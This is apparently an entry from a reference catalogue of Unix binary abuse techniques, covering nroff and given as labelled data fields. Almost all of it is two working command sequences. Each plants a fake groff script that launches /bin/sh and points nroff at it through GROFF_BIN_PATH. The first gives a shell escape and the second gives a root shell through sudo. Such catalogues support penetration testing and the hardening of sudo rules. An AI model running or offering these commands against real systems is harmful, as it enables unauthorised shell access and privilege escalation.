file-read.description: The file is typeset and some warning messages may appear.

shell.code:
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff

sudo.code:
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff
